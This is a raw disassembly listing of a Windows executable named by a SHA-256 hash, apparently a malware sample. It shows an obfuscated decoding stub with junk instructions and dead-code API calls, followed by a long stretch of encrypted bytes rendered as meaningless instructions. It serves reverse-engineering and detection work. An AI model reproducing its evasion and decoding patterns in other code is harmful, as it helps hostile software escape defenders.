
b75e3f6b7ebc53b143162747c3ec165d6822db2eb07b503819896ae1b258e4ed.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423e4e
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x42453a
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x42447d
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x4243dd
  4016b8:	push   0x4244e6
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	mov    ebp,0x62bce409
  4017a7:	bound  esp,QWORD PTR [edx+0x62]
  4017aa:	sbb    al,0x5f
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	imul   edi,DWORD PTR [edx+esi*2+0x72],0xc0d92a71
  4017c2:	std    
  4017c3:	dec    esp
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	add    DWORD PTR [ecx-0x5fdc8df3],ecx
  401857:	sub    al,BYTE PTR [eax+0x5b]
  40185a:	mov    al,BYTE PTR [ebp-0x3a]
  40185d:	xchg   esi,eax
  40185e:	ins    DWORD PTR es:[edi],dx
  40185f:	ret    0x7411
  401862:	cld    
  401863:	inc    eax
  401864:	sub    DWORD PTR [eax-0x7a10e40c],eax
  40186a:	xchg   ebx,eax
  40186b:	push   0xfe780b9a
  401870:	mov    ds:0x74c7370d,eax
  401875:	inc    edi
  401876:	push   ecx
  401877:	cld    
  401878:	hlt    
  401879:	sbb    eax,0xac410c0e
  40187e:	add    al,0x38
  401880:	sub    esp,DWORD PTR [edi]
  401882:	stos   DWORD PTR es:[edi],eax
  401883:	imul   esp,DWORD PTR [edi],0xffffffee
  401886:	cld    
  401887:	pushf  
  401888:	jmp    0x3f63:0xd464c85e
  40188f:	mov    ds:0xfb33b0f8,al
  401894:	(bad)  
  401895:	in     eax,0x92
  401897:	(bad)  
  401898:	call   0xe88a2cd1
  40189d:	imul   esi,DWORD PTR [ebx],0x9c535d32
  4018a3:	nop
  4018a4:	cs pop esp
  4018a6:	jl     0x401888
  4018a8:	and    BYTE PTR [ebp-0x2c],0x19
  4018ac:	sti    
  4018ad:	(bad)  
  4018ae:	stos   BYTE PTR es:[edi],al
  4018af:	jae    0x4018fa
  4018b1:	cmp    edx,eax
  4018b3:	fs jae 0x401848
  4018b6:	mov    ebp,0x85e5478d
  4018bb:	jbe    0x4018b3
  4018bd:	(bad)  
  4018be:	jns    0x401937
  4018c0:	sbb    esp,DWORD PTR [edx+0x66]
  4018c3:	xchg   ecx,eax
  4018c4:	ins    DWORD PTR es:[edi],dx
  4018c5:	(bad)  
  4018c6:	sti    
  4018c7:	inc    ebp
  4018c8:	cmp    BYTE PTR [ecx+0x4b3c106d],dl
  4018ce:	jg     0x401876
  4018d0:	in     eax,0xc1
  4018d2:	ss stc 
  4018d4:	ins    BYTE PTR es:[edi],dx
  4018d5:	and    al,0xf3
  4018d7:	lods   eax,DWORD PTR ds:[esi]
  4018d8:	into   
  4018d9:	enter  0xc5e5,0xfb
  4018dd:	mov    cl,0x23
  4018df:	push   edi
  4018e0:	sbb    al,0xb3
  4018e2:	sbb    edx,ebx
  4018e4:	adc    cl,ah
  4018e6:	sub    esp,DWORD PTR [ebx+0x1f]
  4018e9:	call   0xc607:0x215b4d89
  4018f0:	out    0x8a,eax
  4018f2:	aas    
  4018f3:	arpl   WORD PTR [edx+ebp*2-0x26d8a6fa],ax
  4018fa:	jge    0x401886
  4018fc:	enter  0x9cda,0x56
  401900:	mov    bh,0xe4
  401902:	mov    DWORD PTR [esp+esi*4-0x6b18d292],ecx
  401909:	push   esi
  40190a:	inc    eax
  40190b:	add    eax,0x90be0df1
  401910:	mov    ds:0x4b9d3467,eax
  401915:	push   ebp
  401916:	xchg   edi,eax
  401917:	fdiv   DWORD PTR [eax+0x79]
  40191a:	mov    ch,0xe
  40191c:	push   es
  40191d:	(bad)
  401921:	cld    
  401922:	(bad)  
  401923:	inc    eax
  401925:	jmp    0x4018ac
  401927:	jge    0x401955
  401929:	lods   al,BYTE PTR ds:[esi]
  40192a:	(bad)  
  40192b:	dec    edx
  40192c:	jae    0x4018d0
  40192e:	inc    esp
  40192f:	jp     0x40191f
  401931:	jecxz  0x40195f
  401933:	pop    eax
  401934:	cmp    ebx,esi
  401936:	xor    dl,bh
  401938:	daa    
  401939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40193a:	xchg   BYTE PTR [edx+0x4d],dl
  40193d:	xchg   edi,eax
  40193e:	xor    DWORD PTR [edi],0x55
  401941:	wbinvd 
  401943:	adc    DWORD PTR [ebx],esi
  401945:	xchg   ebx,eax
  401946:	scas   al,BYTE PTR es:[edi]
  401947:	push   ebx
  401948:	sbb    ch,ch
  40194a:	fidiv  DWORD PTR [ebx+0x4]
  40194d:	jmp    0x4163:0xc764cae0
  401954:	(bad)  
  401955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401956:	cli    
  401957:	(bad)  [ecx]
  401959:	in     al,0xeb
  40195b:	lods   eax,DWORD PTR ds:[esi]
  40195c:	in     eax,0xa2
  40195e:	mov    gs,ecx
  401960:	hlt    
  401961:	inc    ebp
  401962:	jp     0x4019bf
  401964:	mov    al,ds:0x14a829db
  401969:	and    ah,BYTE PTR [ecx]
  40196b:	and    esp,eax
  40196d:	jne    0x401912
  40196f:	popa   
  401970:	sub    dl,BYTE PTR [esi-0x5054fbc9]
  401976:	push   eax
  401977:	call   0x2cef:0x57ae99ab
  40197e:	jno    0x401928
  401980:	pop    esi
  401981:	pushf  
  401982:	mov    esi,0x5303b6cc
  401987:	adc    DWORD PTR [eax+0x35122769],eax
  40198d:	sub    cl,BYTE PTR [esi-0x2]
  401990:	jge    0x4019a1
  401992:	iret   
  401993:	in     eax,0x32
  401995:	repz aas 
  401997:	dec    ebx
  401998:	(bad)
  40199b:	mov    fs,eax
  40199d:	inc    ebx
  40199e:	and    edx,DWORD PTR [edi-0x62393f46]
  4019a4:	pop    ebp
  4019a5:	pop    eax
  4019a6:	popa   
  4019a7:	ss jge 0x4019f0
  4019aa:	jae    0x401961
  4019ac:	jl     0x401949
  4019ae:	pusha  
  4019af:	xor    al,0xd5
  4019b1:	fldenv [eax]
  4019b3:	add    eax,0xde1f2862
  4019b8:	aaa    
  4019b9:	sbb    BYTE PTR [ebx+0x31],bh
  4019bc:	jne    0x40199e
  4019be:	pop    edi
  4019bf:	stos   DWORD PTR es:[edi],eax
  4019c0:	pop    ds
  4019c1:	fistp  QWORD PTR [ebp-0x7d]
  4019c4:	pop    ss
  4019c5:	mov    al,ds:0xf760e259
  4019ca:	jecxz  0x401a2c
  4019cc:	call   0xc39d:0xe942e7df
  4019d3:	push   eax
  4019d4:	dec    eax
  4019d5:	sbb    dl,bh
  4019d7:	mov    edi,DWORD PTR [ebx]
  4019d9:	gs jne 0x4019fd
  4019dc:	mov    esp,0xd6b32616
  4019e1:	push   esi
  4019e2:	dec    ebx
  4019e3:	sahf   
  4019e4:	js     0x4019a2
  4019e6:	pop    esp
  4019e7:	add    eax,0x797e8e1a
  4019ec:	fisub  DWORD PTR [edx-0x4e8f2e09]
  4019f2:	(bad)  
  4019f3:	neg    DWORD PTR [ecx-0x25]
  4019f6:	mov    al,0x89
  4019f8:	cmp    eax,0x69d1f158
  4019fd:	push   eax
  4019fe:	cld    
  4019ff:	mov    WORD PTR [eax],?
  401a01:	shl    DWORD PTR [edx+0x18669065],0x8d
  401a08:	xor    esi,DWORD PTR [ebp+eiz*2-0x7a]
  401a0c:	sub    BYTE PTR [edx+0x793afee2],ch
  401a12:	push   edx
  401a13:	lds    eax,FWORD PTR [edi+0x2303a03e]
  401a19:	sbb    al,0xcc
  401a1b:	pop    ecx
  401a1c:	outs   dx,DWORD PTR ds:[esi]
  401a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a1e:	(bad)  
  401a1f:	(bad)  
  401a20:	in     al,0xfc
  401a22:	loop   0x401a9a
  401a24:	xor    eax,0x3908ae72
  401a29:	in     eax,0x99
  401a2b:	test   BYTE PTR [ebx],cl
  401a2d:	mov    al,0xbb
  401a2f:	sub    DWORD PTR [edx+edi*2+0x53d82bf5],eax
  401a36:	dec    edi
  401a37:	test   BYTE PTR [eax-0x5f423025],dl
  401a3d:	out    dx,eax
  401a3e:	cmp    BYTE PTR [ebx-0x4e],dh
  401a41:	lock adc BYTE PTR [edx-0x7fed276e],dl
